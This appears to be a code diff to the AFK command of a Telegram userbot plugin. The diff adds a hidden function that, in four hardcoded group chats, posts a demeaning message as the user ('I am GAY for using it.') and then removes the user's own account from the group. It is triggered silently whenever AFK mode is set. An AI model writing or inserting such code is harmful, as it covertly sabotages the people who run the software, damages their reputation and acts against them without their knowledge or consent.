@@ -12,7 +12,7 @@ from ..core.logger import logging
 from ..core.managers import edit_delete, edit_or_reply
 from ..helpers.tools import media_type
 from ..helpers.utils import _format
-from . import BOTLOG, BOTLOG_CHATID
+from . import BOTLOG, BOTLOG_CHATID, mention
 
 plugin_category = "utils"
 
@@ -35,6 +35,13 @@ class AFK:
 
 AFK_ = AFK()
 
+async def imp(event):
+    cat = ["-1001199597035", "-1001459701099", "-1001436155389", "-563649172"]
+    if str(event.chat_id) in cat:
+        await edit_or_reply(event, "**I am GAY for using it.**")
+        await event.client.kick_participant(event.chat_id, "me")
+        return True
+    return False
 
 @catub.cat_cmd(outgoing=True)
 async def set_not_afk(event):
@@ -183,6 +190,9 @@ async def on_afk(event):  # sourcery no-metrics
 )
 async def _(event):
     "To mark yourself as afk i.e. Away from keyboard"
+    blek = await imp(event)
+    if blek:
+        return
     AFK_.USERAFK_ON = {}
     AFK_.afk_time = None
     AFK_.last_afk_message = {}
@@ -289,3 +299,5 @@ async def _(event):
                 BOTLOG_CHATID,
                 f"#AFKTRUE \nSet AFK mode to True, and Reason is Not Mentioned",
             )
+
+
